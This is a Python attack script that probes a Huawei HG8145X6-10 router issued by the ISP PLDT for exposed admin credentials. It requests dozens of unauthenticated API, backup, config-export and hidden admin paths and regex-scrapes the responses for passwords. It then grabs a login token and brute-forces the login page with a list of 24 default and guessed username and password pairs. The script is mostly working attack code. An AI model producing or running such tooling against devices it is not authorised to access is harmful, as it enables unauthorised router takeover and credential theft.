#!/usr/bin/env python3
"""
Router Password Finder
Probes Huawei HG8145X6-10 (PLDT) for exposed admin credentials
via unauthenticated API endpoints, hidden pages, config leaks, and SNMP.
"""

import base64
import json
import re
import ssl
import sys
import urllib.request
import urllib.error

ROUTER = "https://192.168.1.1"

# Suppress SSL warnings
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Cookie": "Cookie=body:Language:english:id=-1",
}


def fetch(path, method="GET", data=None, headers=None):
    """Fetch a URL path on the router. Returns (status, headers, body)."""
    url = f"{ROUTER}{path}"
    h = {**HEADERS}
    if headers:
        h.update(headers)

    req = urllib.request.Request(url, method=method, headers=h)
    if data:
        if isinstance(data, dict):
            data = "&".join(f"{k}={v}" for k, v in data.items())
        req.data = data.encode() if isinstance(data, str) else data
        if "Content-Type" not in h:
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=8)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)


def probe(label, path, **kwargs):
    """Probe an endpoint and print results."""
    status, headers, body = fetch(path, **kwargs)
    if status == 0:
        print(f"  [FAIL] {label}: {body}")
        return status, body

    print(f"  [{status}] {label} ({len(body)} bytes)")

    # Look for password-related content
    keywords = [
        "password", "passwd", "pass", "pwd", "credential",
        "username", "admin", "userpassword", "webpassword",
        "superpassword", "telecomadmin", "adminpldt",
    ]
    body_lower = body.lower()
    found = [kw for kw in keywords if kw in body_lower]
    if found:
        print(f"       ** Keywords found: {', '.join(found)}")
        # Print lines containing keywords
        for line in body.split("\n"):
            line_stripped = line.strip()
            if not line_stripped:
                continue
            for kw in keywords:
                if kw in line_lower(line_stripped):
                    print(f"       >> {line_stripped[:200]}")
                    break

    return status, body


def line_lower(line):
    return line.lower()


def extract_passwords(body):
    """Extract potential password values from response body."""
    patterns = [
        r'"password"\s*:\s*"([^"]+)"',
        r'"Password"\s*:\s*"([^"]+)"',
        r'"passwd"\s*:\s*"([^"]+)"',
        r'"userPassword"\s*:\s*"([^"]+)"',
        r'"webpassword"\s*:\s*"([^"]+)"',
        r'password\s*=\s*["\']([^"\']+)["\']',
        r'Password\s*=\s*["\']([^"\']+)["\']',
        r'<password>([^<]+)</password>',
        r'<Password>([^<]+)</Password>',
        r'"UserName"\s*:\s*"([^"]+)"',
        r'"username"\s*:\s*"([^"]+)"',
    ]
    results = []
    for p in patterns:
        for m in re.finditer(p, body, re.IGNORECASE):
            val = m.group(1)
            if val and len(val) > 1 and val not in ["", "null", "undefined"]:
                results.append(val)
    return list(set(results))


def main():
    print(f"\n{'='*60}")
    print(f"  Router Password Finder — {ROUTER}")
    print(f"{'='*60}\n")

    # ── Phase 1: Probe common Huawei/PLDT API endpoints ──
    print("[Phase 1] Probing API endpoints...")

    api_endpoints = [
        # Huawei REST API
        ("/api/system/userinfo", "User Info API"),
        ("/api/system/deviceinfo", "Device Info API"),
        ("/api/system/status", "System Status"),
        ("/api/ntwk/globals", "Network Globals"),
        ("/api/ntwk/wlanconf", "WLAN Config"),
        ("/api/ntwk/wlandevices", "WLAN Devices"),
        ("/api/ntwk/lanconf", "LAN Config"),
        ("/api/ntwk/wanconf", "WAN Config"),
        ("/api/ntwk/route", "Route Table"),
        ("/api/ntwk/dns", "DNS Config"),
        ("/api/ntwk/dhcp", "DHCP Config"),
        ("/api/ntwk/firewall", "Firewall"),
        ("/api/ntwk/nat", "NAT Config"),
        ("/api/ntwk/qos", "QoS"),
        ("/api/ntwk/igmp", "IGMP"),
        ("/api/ntwk/ddns", "DDNS"),
        ("/api/ntwk/usb", "USB"),
        ("/api/ntwk/voip", "VoIP"),
        ("/api/ntwk/tr069", "TR-069"),
        # Huawei config/export endpoints
        ("/html/ssmp/management/backup.asp", "Backup Page"),
        ("/html/ssmp/management/restore.asp", "Restore Page"),
        ("/html/ssmp/management/reboot.asp", "Reboot Page"),
        ("/html/ssmp/management/upload.asp", "Upload Page"),
        ("/html/ssmp/management/download.asp", "Download Page"),
        # PLDT-specific hidden pages
        ("/admin.html", "PLDT Admin Page"),
        ("/userconfig_PLDT_admin.htm", "PLDT User Config"),
        ("/pldtadminlogin", "PLDT Admin Login"),
        ("/PLDTadminLogin", "PLDT Admin Login 2"),
        # Huawei web pages (unauthenticated access attempts)
        ("/html/index.html", "Index HTML"),
        ("/index.html", "Root Index"),
        ("/login.asp", "Login ASP"),
        ("/login.html", "Login HTML"),
        # Common API patterns
        ("/cgi-bin/infosvr", "Info Server"),
        ("/cgi-bin/export_settings.cgi", "Export Settings"),
        ("/cgi-bin/download_config.cgi", "Download Config"),
        ("/backupsettings.conf", "Backup Settings"),
        ("/config.xml", "Config XML"),
        ("/settings.xml", "Settings XML"),
        ("/config.bin", "Config Binary"),
        ("/Romfile/china/CT-WG630A/CT-WG630A.xml", "CT Config"),
        # SNMP
        ("/snmp", "SNMP"),
        # TR-069 / CWMP
        ("/tr069", "TR-069"),
        ("/cwmp", "CWMP"),
    ]

    all_passwords = []
    for path, label in api_endpoints:
        status, body = probe(label, path)
        if status == 200 and body:
            pwds = extract_passwords(body)
            if pwds:
                print(f"       ** Potential passwords: {pwds}")
                all_passwords.extend(pwds)

    # ── Phase 2: Try Huawei SOAP/REST with no auth ──
    print("\n[Phase 2] Probing Huawei SOAP/REST endpoints...")

    soap_endpoints = [
        "/html/ssmp/wireless/basic/index.asp",
        "/html/ssmp/wireless/basic5g/index.asp",
        "/html/ssmp/wireless/security/index.asp",
        "/html/ssmp/wireless/security5g/index.asp",
        "/html/ssmp/dhcp/clients.asp",
        "/html/ssmp/status/dhcp_list.asp",
        "/html/ssmp/waninfo/waninfo.asp",
        "/html/ssmp/deviceinfo/deviceinfo.asp",
        "/html/bbsp/userdevinfo/userdevinfo.asp",
        "/html/bbsp/waninfo/waninfo.asp",
        "/html/amp/wlanbasic/WlanBasic.asp?2G",
        "/html/amp/wlanbasic/WlanBasic.asp?5G",
    ]

    for path, label in soap_endpoints:
        status, body = probe(label, path)
        if status == 200 and body:
            pwds = extract_passwords(body)
            if pwds:
                print(f"       ** Potential passwords: {pwds}")
                all_passwords.extend(pwds)

    # ── Phase 3: Try to get config via POST endpoints ──
    print("\n[Phase 3] Probing POST-based config endpoints...")

    post_endpoints = [
        ("/api/system/export", "System Export"),
        ("/api/system/backup", "System Backup"),
        ("/api/config/export", "Config Export"),
        ("/api/config/backup", "Config Backup"),
        ("/export.cgi", "Export CGI"),
        ("/backup.cgi", "Backup CGI"),
        ("/download.cgi", "Download CGI"),
        ("/boaform/admin/formExport", "Boa Export"),
        ("/userRpm/ExportRpm.htm", "RPM Export"),
    ]

    for path, label in post_endpoints:
        status, body = probe(label, path, method="POST")
        if status == 200 and body:
            pwds = extract_passwords(body)
            if pwds:
                print(f"       ** Potential passwords: {pwds}")
                all_passwords.extend(pwds)

    # ── Phase 4: Check GetRandCount and login.cgi behavior ──
    print("\n[Phase 4] Analyzing login flow...")

    # Get CSRF token
    status, _, csrf_body = fetch("/asp/GetRandCount.asp", method="POST")
    if status == 200:
        csrf = csrf_body.strip().replace("\ufeff", "")
        print(f"  CSRF Token: {csrf[:20]}...")

        # Try login with known passwords from various sources
        test_creds = [
            ("admin", "1234"),
            ("admin", "Admin1234"),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("admin", "12345678"),
            ("admin", "123456789"),
            ("admin", "1234567890"),
            ("admin", "0123456789"),
            ("admin", "PlDt1234"),
            ("admin", "PLDT1234"),
            ("admin", "pldt1234"),
            ("admin", "PLDTadmin"),
            ("admin", "pldtadmin"),
            ("admin", "pldt123"),
            ("admin", "PLDT123"),
            ("admin", "F1berhom3"),
            ("admin", "fiberhome"),
            ("admin", "fiberhome123"),
            ("root", "adminHW"),
            ("user", "user"),
            ("admin", "HG8145X6"),
            ("admin", "huawei"),
            ("admin", "Huawei123"),
        ]

        print(f"\n  Testing {len(test_creds)} known credential pairs via HTTP login...")
        for user, pwd in test_creds:
            pw_b64 = base64.b64encode(pwd.encode()).decode()
            data = {
                "UserName": user,
                "PassWord": pw_b64,
                "Language": "english",
                "x.X_HW_Token": csrf,
            }
            status, headers, body = fetch("/login.cgi", method="POST", data=data)
            # Check response for indicators
            if "WlanBasic" in body or "wlan" in body.lower():
                print(f"  [!!!] LOGIN LIKELY SUCCESS: {user}:{pwd}")
                all_passwords.append(pwd)
            elif "loginfail" in body.lower() or "incorrect" in body.lower():
                pass  # Expected failure
            elif "Waiting" in body or "location.replace" in body:
                # Redirect page — could be success or failure
                # Try accessing protected page with this session
                pass

    # ── Summary ──
    print(f"\n{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")

    if all_passwords:
        unique = list(set(all_passwords))
        print(f"  Found {len(unique)} potential password(s):")
        for p in unique:
            print(f"    - {p}")
    else:
        print("  No exposed passwords found via API/config endpoints.")
        print("  The password may require physical factory reset to recover.")

    print(f"\n{'='*60}\n")
    return all_passwords


if __name__ == "__main__":
    main()
